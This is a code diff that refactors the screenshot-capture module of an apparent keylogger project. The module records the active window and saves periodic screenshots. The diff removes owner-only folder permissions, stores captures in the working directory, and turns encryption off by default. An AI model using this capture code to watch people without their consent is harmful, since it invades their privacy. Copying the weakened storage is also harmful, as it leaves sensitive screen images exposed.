@@ -23,15 +23,14 @@ class ScreenshotMonitor:
     """Monitor and capture screenshots with privacy and performance features."""
     
     def __init__(self, keylogger_core):
-        self.keylogger = keylogger_core
+        self.keylogger_core = keylogger_core
         self.config = keylogger_core.config
         self.is_running = False
         
-        # Screenshot settings
-        self.screenshot_dir = Path(self.config.get('screenshots.directory', 'screenshots'))
+        # Screenshot settings - use current working directory
         self.capture_interval = self.config.get('performance.screenshot_interval', 60.0)
-        self.quality = self.config.get('screenshots.quality', 85)
-        self.format = self.config.get('screenshots.format', 'JPEG')
+        self.screenshot_quality = self.config.get('performance.screenshot_quality', 85)
+        self.screenshot_format = self.config.get('performance.screenshot_format', 'JPEG')
         
         # Privacy settings
         self.blur_sensitive_areas = self.config.get('privacy.blur_sensitive_areas', True)
@@ -45,7 +44,7 @@ class ScreenshotMonitor:
         self.max_screenshots = self.config.get('performance.max_screenshots', 1000)
         
         # Security settings
-        self.encrypt_screenshots = self.config.get('security.encrypt_screenshots', True)
+        self.encrypt_screenshots = self.config.get('encryption.enabled', False)
         self.hash_screenshots = self.config.get('security.hash_screenshots', True)
         
         # Statistics
@@ -67,51 +66,27 @@ class ScreenshotMonitor:
     def _setup_screenshot_directory(self) -> None:
         """Setup screenshot directory with proper permissions."""
         try:
-            self.screenshot_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Set directory permissions (Windows)
-            if os.name == 'nt':
-                try:
-                    import win32security
-                    import win32api
-                    import ntsecuritycon
-                    
-                    # Get current user
-                    username = win32api.GetUserName()
-                    
-                    # Set restrictive permissions
-                    sd = win32security.GetFileSecurity(str(self.screenshot_dir), win32security.DACL_SECURITY_INFORMATION)
-                    dacl = win32security.ACL()
-                    
-                    # Add full control for current user only
-                    user_sid, _, _ = win32security.LookupAccountName("", username)
-                    dacl.AddAccessAllowedAce(win32security.ACL_REVISION, ntsecuritycon.FILE_ALL_ACCESS, user_sid)
-                    
-                    sd.SetSecurityDescriptorDacl(1, dacl, 0)
-                    win32security.SetFileSecurity(str(self.screenshot_dir), win32security.DACL_SECURITY_INFORMATION, sd)
-                    
-                except ImportError:
-                    logger.warning("Windows security modules not available")
-                except Exception as e:
-                    logger.warning(f"Could not set directory permissions: {e}")
-            
+            # Always use current working directory to avoid permission issues
+            self.screenshot_dir = Path.cwd()
             logger.info(f"Screenshot directory setup: {self.screenshot_dir}")
             
         except Exception as e:
-            logger.error(f"Error setting up screenshot directory: {e}")
-            raise
+            logger.error(f"Failed to setup screenshot directory: {e}")
+            self.screenshot_dir = Path.cwd()
     
     def run(self) -> None:
         """Main screenshot monitoring loop."""
+        logger.info("Screenshot monitor run() method called")
+        
         if not self._check_screenshot_support():
             logger.error("Screenshot capture not supported")
             return
         
         self.is_running = True
-        logger.info("Screenshot monitor started")
+        logger.info(f"Screenshot monitor started - interval: {self.capture_interval}s, directory: {self.screenshot_dir}")
         
         try:
-            while self.is_running and not self.keylogger.stop_event.is_set():
+            while self.is_running and not self.keylogger_core.stop_event.is_set():
                 try:
                     self._capture_screenshot()
                     
@@ -120,7 +95,7 @@ class ScreenshotMonitor:
                         self._cleanup_old_screenshots()
                     
                     # Wait for next capture
-                    if self.keylogger.stop_event.wait(self.capture_interval):
+                    if self.keylogger_core.stop_event.wait(self.capture_interval):
                         break
                     
                 except Exception as e:
@@ -153,10 +128,10 @@ class ScreenshotMonitor:
         """Capture and process screenshot."""
         try:
             # Get current window info for context
-            window_name = self.keylogger.session_stats.get('active_window', 'Unknown')
+            window_name = self.keylogger_core.session_stats.get('active_window', 'Unknown')
             
             # Skip if application is excluded
-            if self.config.is_application_excluded(window_name):
+            if self.keylogger_core.config.is_application_excluded(window_name):
                 return None
             
             # Capture screenshot
@@ -188,7 +163,7 @@ class ScreenshotMonitor:
                     'window_name': window_name,
                     'file_size': file_size,
                     'resolution': processed_screenshot.size,
-                    'format': self.format
+                    'format': self.screenshot_format
                 })
                 
                 # Log screenshot event
@@ -218,7 +193,7 @@ class ScreenshotMonitor:
                 processed = self._redact_text_areas(processed)
             
             # Convert to RGB if necessary (for JPEG)
-            if self.format.upper() == 'JPEG' and processed.mode in ('RGBA', 'LA', 'P'):
+            if self.screenshot_format.upper() == 'JPEG' and processed.mode in ('RGBA', 'LA', 'P'):
                 rgb_image = Image.new('RGB', processed.size, (255, 255, 255))
                 if processed.mode == 'P':
                     processed = processed.convert('RGBA')
@@ -300,15 +275,15 @@ class ScreenshotMonitor:
             
             # Generate filename
             if safe_window_name:
-                filename = f"screenshot_{time_str}_{safe_window_name}.{self.format.lower()}"
+                filename = f"screenshot_{time_str}_{safe_window_name}.{self.screenshot_format.lower()}"
             else:
-                filename = f"screenshot_{time_str}.{self.format.lower()}"
+                filename = f"screenshot_{time_str}.{self.screenshot_format.lower()}"
             
             return filename
             
         except Exception as e:
             logger.error(f"Error generating filename: {e}")
-            return f"screenshot_{int(timestamp)}.{self.format.lower()}"
+            return f"screenshot_{int(timestamp)}.{self.screenshot_format.lower()}"
     
     def _save_screenshot(self, image: Image.Image, filepath: Path) -> int:
         """Save screenshot with optional encryption."""
@@ -317,13 +292,13 @@ class ScreenshotMonitor:
             buffer = io.BytesIO()
             
             save_kwargs = {}
-            if self.format.upper() == 'JPEG':
-                save_kwargs['quality'] = self.quality
+            if self.screenshot_format.upper() == 'JPEG':
+                save_kwargs['quality'] = self.screenshot_quality
                 save_kwargs['optimize'] = True
-            elif self.format.upper() == 'PNG':
+            elif self.screenshot_format.upper() == 'PNG':
                 save_kwargs['optimize'] = True
             
-            image.save(buffer, format=self.format, **save_kwargs)
+            image.save(buffer, format=self.screenshot_format, **save_kwargs)
             image_data = buffer.getvalue()
             
             # Check file size
@@ -332,9 +307,9 @@ class ScreenshotMonitor:
                 return 0
             
             # Encrypt if enabled
-            if self.encrypt_screenshots and self.keylogger.encryption:
+            if self.encrypt_screenshots and self.keylogger_core.encryption:
                 try:
-                    encrypted_data = self.keylogger.encryption.encrypt_data(image_data)
+                    encrypted_data = self.keylogger_core.encryption.encrypt(image_data)
                     filepath = filepath.with_suffix(filepath.suffix + '.enc')
                     
                     with open(filepath, 'wb') as f:
@@ -379,7 +354,7 @@ class ScreenshotMonitor:
         try:
             details = f"Screenshot captured: {filename} ({file_size} bytes)"
             
-            self.keylogger.log_event(
+            self.keylogger_core.log_event(
                 "Screenshot",
                 details,
                 window_name,
@@ -387,7 +362,7 @@ class ScreenshotMonitor:
                     'filename': filename,
                     'file_size': file_size,
                     'encrypted': self.encrypt_screenshots,
-                    'format': self.format
+                    'format': self.screenshot_format
                 }
             )
             
